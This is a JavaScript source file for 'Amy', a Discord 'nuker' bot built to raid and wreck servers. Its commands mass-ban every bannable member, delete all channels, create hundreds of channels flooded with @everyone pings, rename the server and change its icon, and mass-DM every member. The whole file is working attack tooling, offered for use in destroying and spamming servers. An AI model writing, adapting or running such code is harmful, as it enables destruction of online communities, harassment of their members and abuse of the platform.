// https://github.com/17teen
// Discord: 7teen#1464

const Discord = require('discord.js');
const client = new Discord.Client();
const { red, green, blue, yellow, cyan, greenBright, redBright, bgMagentaBright, magenta, magentaBright, yellowBright, bgRedBright, blueBright } = require('chalk');
const settings = require('./settings.json');
const token = settings.token;
const prefix = settings.prefix;
const founder = settings.founder;
const organisation = settings.organisation;
const invite = settings.invite;

// Title

const amy = String.raw`
                                                                                     
         @@@@@@   @@@@@@@@@@   @@@ @@@     @@@  @@@  @@@  @@@  @@@  @@@  @@@@@@@@  @@@@@@@   
        @@@@@@@@  @@@@@@@@@@@  @@@ @@@     @@@@ @@@  @@@  @@@  @@@  @@@  @@@@@@@@  @@@@@@@@  
        @@!  @@@  @@! @@! @@!  @@! !@@     @@!@!@@@  @@!  @@@  @@!  !@@  @@!       @@!  @@@  
        !@!  @!@  !@! !@! !@!  !@! @!!     !@!!@!@!  !@!  @!@  !@!  @!!  !@!       !@!  @!@  
        @!@!@!@!  @!! !!@ @!@   !@!@!      @!@ !!@!  @!@  !@!  @!@@!@!   @!!!:!    @!@!!@!   
        !!!@!!!!  !@!   ! !@!    @!!!      !@!  !!!  !@!  !!!  !!@!!!    !!!!!:    !!@!@!    
        !!:  !!!  !!:     !!:    !!:       !!:  !!!  !!:  !!!  !!: :!!   !!:       !!: :!!   
        :!:  !:!  :!:     :!:    :!:       :!:  !:!  :!:  !:!  :!:  !:!  :!:       :!:  !:!  
        ::   :::  :::     ::      ::        ::   ::  ::::: ::   ::  :::   :: ::::  ::   :::  
         :   : :   :      :       :        ::    :    : :  :    :   :::  : :: ::    :   : :  
                                                                                                 
         

                                        Made By: ${founder}
`;

console.log(red(amy));

client.on("ready", () => {
    console.log(``);
    console.log(``);
    console.log(greenBright(`                                 [©] LOGIN: Successful`));
    console.log(greenBright(`                                 [©] BOT: ${client.user.username}#${client.user.discriminator}`));
    console.log(greenBright(`                                 [©] PREFIX: ${prefix}`));
    console.log(``);
    console.log(red(`                                 [©] Mass Delete Channels | [©] Mass Creates Channels`));
    console.log(red(`                                 [©] Mass Pings Channels  | [©] Mass DMs`));
    console.log(red(`                                 [©] Fucks The Server     | [©] Mass Spam`));
    console.log(red(`                                 [©] Purge [1-100]`));
    console.log(``);
    console.log(yellow(`                                 [©] PERMISSION REQUIRED: Administrator`));
    console.log(``);
    console.log(``);
    client.user.setActivity({
        name: "your demise.",
        type: "STREAMING",
        url: "https://www.twitch.tv/ayoohennio", // Follow my twitch ;) | Feel free to change these
    })
});

// Test/Ping

client.on("message", message => {

    // Test Command
    if (message.content.startsWith(prefix + "ping")) {
        message.channel.send("Pong!")
    }


});

// AMY NUKER

client.on('message', message => {

    if (message.content.startsWith(prefix + 'help')) {
        const helpembed = new Discord.MessageEmbed()
            .setTitle(`7TEEN NUKER PRESENTS: AMY`)
            .setDescription(`\`NUKE\` \n\`ABOUT\` \n\`INVITE\` [Amy](${invite})`)
            .setFooter(`© Amy | Prefix: ${prefix} | By: ${founder}`)
            .setColor(0xFF0000)
        message.channel.send(helpembed);
    }

    if (message.content.startsWith(prefix + 'nuke')) {
        const helpembed = new Discord.MessageEmbed()
            .setTitle(`NUKER`)
            .setDescription(`\`MASS BAN\`: **mban** \n\`CREATE CHANNELS\`: **cc [text]** \n\`MASS DELETE CHANNELS\`: **cd** \n\`MASS PING AND CHANNELS\`: **mp** \n\`FUCK SERVER\`: **fuck [text]**\n\`MASS DM\`: dm [text]`)
            .setFooter(`© Amy | Prefix: ${prefix} | By: ${founder}`)
            .setColor(0xFF0000)
        message.channel.send(helpembed);
    }

    // About CMD
    if (message.content.startsWith(prefix + 'about')) {
        const about = new Discord.MessageEmbed()
            .setTitle(` About`)
            .setDescription(`*This is a Vissage production.*\n\n**Founder of Amy** \n \`Discord:\` ${founder} \n \`Github:\` [7teen](https://github.com/17teen) \n \`Telegram:\` [7teen](https://t.me/real7teen) \n \n **Oragnization:** \n \`Vissage:\` [Vissage Inc.](${organisation}) \n\n **Bot Description:** \n \`Creation Date:\` 10/11/2020 \n \`Language:\` JavaScript, Batch \n \`Operating System:\` Windows , macOS`)
            .setThumbnail(`${client.user.avatarURL({ dynamic: true })}`)
            .setFooter(`© Amy | Prefix: ${prefix} | By: ${founder}`)
            .setColor(0xFFFEFE)
            .setTimestamp(Date.now());
        message.channel.send(about);
    }

    // PURGE MESSAGE

    if (message.content.startsWith(prefix + "purge")) {

        let color = ((1 << 24) * Math.random() | 0).toString(16); //Generates random hex value.

        const nopurgeembed = new Discord.MessageEmbed()
            .setDescription("*You don't have permission to use this command*")
            .setColor(`#${color}`)

        let args = message.content.split(" ").slice(1);
        var argresult = args.join(' ');

        if (!message.member.hasPermission("ADMINISTRATOR")) return message.channel.send(nopurgeembed)
        if (message.member.hasPermission("ADMINISTRATOR")) {
            message.channel.bulkDelete(argresult).then(() => {
                message.channel.send(`***deleted ${argresult} messages***`)
                    .then(message => {
                        message.delete({ timeout: 1000 })
                    })
            })
        }

    }

    if (message.content.startsWith(prefix + 'mban')) {

        message.guild.members.cache.filter(member => member.bannable).forEach(member => {
            member.ban().then(
                console.log(bgMagentaBright(`${member.user.username} Has been banned `))
            )
        });
        message.delete({ timeout: 1000 });
        try {

        } catch (e) {

            console.log(e.stack);

        }
    }

    if (message.content.startsWith(prefix + 'mban2')) {

        message.guild.members.cache.filter(member => member.bannable).map(member => {
            member.ban().then(
                console.log(magentaBright(`${member.user.username} Has been banned `))
            )
        });
        message.delete({ timeout: 1000 });
        try {

        } catch (e) {

            console.log(e.stack);

        }
    }


    // Mass Channels      

    if (message.content.startsWith(prefix + 'cc')) {
        let args = message.content.split(" ").slice(1);
        var argresult = args.join(' ');
        for (var i = 0; i < 250; i++) {
            message.guild.channels.create(argresult)
            console.log(yellowBright(`CHANNEL MASSED!`))
        }

    }

    // Mass Channel & Ping Every Channel

    if (message.content.startsWith(prefix + 'mp')) {
        let args = message.content.split(" ").slice(1);
        var argresult = args.join(' ');
        // If you dont give an input
        if (!argresult) {
            for (var i = 0; i < 250; i++) {
                message.guild.channels.create('wizzed by ' + message.author.username)

                for (var i = 0; i < 250; i++) {
                    let channels = message.guild.channels.create('wizzed by ' + message.author.username)

                    channels.then(
                        function (channel, index) {
                            for (var i = 0; i < 250; i++) {
                                channel.send('@everyone')
                                console.log(blueBright(`CHANNEL PINGED!`));
                                // other per-channnel logic
                            }
                        }
                    );
                }

            }
        }
        // If you give an input
        for (var i = 0; i < 250; i++) {
            let channels = message.guild.channels.create(argresult)

            channels.then(
                function (channel, index) {
                    for (var i = 0; i < 250; i++) {
                        channel.send('@everyone')
                        console.log(blueBright(`CHANNEL PINGED!`));
                        // other per-channnel logic
                    }
                }
            );
        }
    }




    if (message.content.startsWith(prefix + 'cd')) {
        message.guild.channels.cache.forEach(channel => channel.delete().then(
            console.log(redBright(`CHANNEL FUCKED`))
        )); // deletes all channels
        message.delete();
    }


    // Fuck the server      

    if (message.content.startsWith(prefix + 'fuck')) {

        message.guild.setName(`Wizzed by ${message.author.username}`).then(console.log(green(`Server Name changed to: ${message.author.username} Wizzed`))); // changes server name

        message.guild.channels.cache.forEach(channel => channel.delete().then(
            console.log(redBright(`CHANNEL FUCKED`))
        )); // deletes all channels

        message.guild.setIcon('https://media.discordapp.net/attachments/760871362868150272/760892079584444516/10.jpg') // changes server pfp

        let args = message.content.split(" ").slice(1);
        var argresult = args.join(' ');

        if (!argresult) {
            message.channel.send("*Add an input after the cmd*")
        } else {

            for (var i = 0; i < 250; i++) {
                let channels = message.guild.channels.create(argresult)

                channels.then(
                    function (channel, index) {
                        for (var i = 0; i < 250; i++) {
                            channel.send('@everyone you got wized')
                            console.log(blueBright(`CHANNEL PINGED!`));
                            // other per-channnel logic
                        }
                    }
                )
            }

            message.delete()

        }

    }

    // VERY UNRELIABLE MASS DM

    if (message.content.startsWith(prefix + 'dm')) {

        if (!message.member.hasPermission("ADMINISTRATOR")) {
            message.delete();
            return message.reply(`*Imagine trying to mass dm :skull:*`).then(message => message.delete({ timeout: 2000 }))
        } else {

            let args = message.content.split(" ").slice(1);
            var argresult = args.join(" ");

            message.guild.members.cache.forEach(member => { // Looping through each member of the guild.  // mass dm
                // Trying to send a message to the member.
                // This method might fail because of the member's privacy settings, so we're using .catch
                member.send(argresult).catch(e => console.error(`Couldn't DM member ${member.user.tag}`)).then(console.log(`DM'd ${member.user.tag}`));
            });

        }
        message.delete();
    }
});

client.login(token);
